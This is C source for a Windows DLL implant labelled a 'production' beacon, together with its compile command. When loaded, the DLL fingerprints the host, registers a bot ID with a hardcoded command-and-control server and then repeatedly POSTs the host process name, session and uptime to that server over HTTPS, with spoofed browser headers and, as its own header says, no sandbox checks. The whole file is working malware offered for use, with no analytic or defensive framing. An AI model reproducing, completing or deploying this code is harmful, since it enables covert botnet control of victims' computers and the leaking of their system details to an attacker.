/*
 * Windows Beacon - PRODUCTION VERSION
 * No sandbox checks, immediate beaconing, HTTPS only
 * Compile: x86_64-w64-mingw32-gcc -shared -O2 -s -o dread.dll dread.c -lwinhttp
 */

#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <winhttp.h>
#include <stdio.h>

#pragma comment(lib, "winhttp.lib")

// ==================== CONFIGURATION ====================
#define C2_SERVER L"https://unimportant.onrender.com"
#define BEACON_ENDPOINT L"/beacon"
#define BOT_ID_ENDPOINT L"/register"
#define SLEEP_MIN 20000   // 20 seconds
#define SLEEP_MAX 45000   // 45 seconds
// =======================================================

HANDLE g_hBeaconThread = NULL;
WCHAR g_szBotId[64] = {0};
volatile BOOL g_bRunning = TRUE;

void GenerateBotId(LPWSTR buffer, DWORD bufferSize) {
    WCHAR hostname[256];
    DWORD hostLen = sizeof(hostname) / sizeof(WCHAR);
    GetComputerNameW(hostname, &hostLen);
    
    DWORD serial = 0;
    GetVolumeInformationW(L"C:\\", NULL, 0, &serial, NULL, NULL, NULL, 0);
    
    DWORD hash = 0;
    for (WCHAR* p = hostname; *p; p++) hash = ((hash << 5) + hash) + *p;
    hash ^= serial;
    hash = (hash ^ (hash >> 16)) & 0xFFFF;
    
    swprintf(buffer, bufferSize, L"%s-%04X", hostname, hash);
}

BOOL RegisterWithC2(void) {
    HINTERNET hSession = WinHttpOpen(L"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                                      WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, NULL, NULL, 0);
    if (!hSession) return FALSE;
    
    URL_COMPONENTS urlComp = {0};
    urlComp.dwStructSize = sizeof(urlComp);
    WCHAR host[256] = {0};
    urlComp.lpszHostName = host;
    urlComp.dwHostNameLength = 256;
    
    if (!WinHttpCrackUrl(C2_SERVER, 0, 0, &urlComp)) {
        WinHttpCloseHandle(hSession);
        return FALSE;
    }
    
    HINTERNET hConnect = WinHttpConnect(hSession, host, urlComp.nPort, 0);
    if (!hConnect) { WinHttpCloseHandle(hSession); return FALSE; }
    
    WCHAR path[512];
    swprintf(path, 512, L"%s?bot=%s", BOT_ID_ENDPOINT, g_szBotId);
    
    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"GET", path, NULL, NULL, NULL, WINHTTP_FLAG_SECURE);
    if (!hRequest) { WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession); return FALSE; }
    
    BOOL success = FALSE;
    if (WinHttpSendRequest(hRequest, NULL, 0, NULL, 0, 0, 0)) {
        if (WinHttpReceiveResponse(hRequest, NULL)) {
            DWORD status = 0, size = sizeof(status);
            WinHttpQueryHeaders(hRequest, WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
                               NULL, &status, &size, NULL);
            success = (status == 200);
        }
    }
    
    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);
    return success;
}

BOOL SendBeacon(void) {
    HINTERNET hSession = WinHttpOpen(L"Mozilla/5.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, NULL, NULL, 0);
    if (!hSession) return FALSE;
    
    URL_COMPONENTS urlComp = {0};
    urlComp.dwStructSize = sizeof(urlComp);
    WCHAR host[256] = {0};
    urlComp.lpszHostName = host;
    urlComp.dwHostNameLength = 256;
    
    if (!WinHttpCrackUrl(C2_SERVER, 0, 0, &urlComp)) { WinHttpCloseHandle(hSession); return FALSE; }
    
    HINTERNET hConnect = WinHttpConnect(hSession, host, urlComp.nPort, 0);
    if (!hConnect) { WinHttpCloseHandle(hSession); return FALSE; }
    
    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"POST", BEACON_ENDPOINT, NULL, NULL, NULL, WINHTTP_FLAG_SECURE);
    if (!hRequest) { WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession); return FALSE; }
    
    WCHAR postData[512];
    DWORD tick = GetTickCount();
    WCHAR proc[MAX_PATH]; GetModuleFileNameW(NULL, proc, MAX_PATH);
    WCHAR* shortName = wcsrchr(proc, L'\\'); if (shortName) shortName++; else shortName = proc;
    DWORD sess; ProcessIdToSessionId(GetCurrentProcessId(), &sess);
    
    swprintf(postData, 512, L"bot=%s&uptime=%lu&tick=%lu&proc=%s&session=%lu",
             g_szBotId, tick/60000, tick, shortName, sess);
    
    LPCWSTR headers = L"Content-Type: application/x-www-form-urlencoded\r\n";
    DWORD dataLen = wcslen(postData) * sizeof(WCHAR);
    
    BOOL success = FALSE;
    if (WinHttpSendRequest(hRequest, headers, wcslen(headers), postData, dataLen, dataLen, 0)) {
        if (WinHttpReceiveResponse(hRequest, NULL)) {
            DWORD status = 0, size = sizeof(status);
            WinHttpQueryHeaders(hRequest, WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
                               NULL, &status, &size, NULL);
            success = (status == 200);
        }
    }
    
    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);
    return success;
}

DWORD WINAPI BeaconThread(LPVOID lp) {
    Sleep(3000);  // Initial delay
    
    // Try registration up to 3 times
    for (int i = 0; i < 3; i++) {
        if (RegisterWithC2()) break;
        Sleep(5000);
    }
    
    // Beacon immediately, then loop
    while (g_bRunning) {
        SendBeacon();
        Sleep(20000 + (rand() % 25000));  // 20-45 seconds
    }
    return 0;
}

BOOL APIENTRY DllMain(HMODULE h, DWORD reason, LPVOID lp) {
    if (reason == DLL_PROCESS_ATTACH) {
        DisableThreadLibraryCalls(h);
        GenerateBotId(g_szBotId, sizeof(g_szBotId)/sizeof(WCHAR));
        g_hBeaconThread = CreateThread(NULL, 0, BeaconThread, NULL, 0, NULL);
    }
    if (reason == DLL_PROCESS_DETACH) {
        g_bRunning = FALSE;
        if (g_hBeaconThread) { WaitForSingleObject(g_hBeaconThread, 3000); CloseHandle(g_hBeaconThread); }
    }
    return TRUE;
}
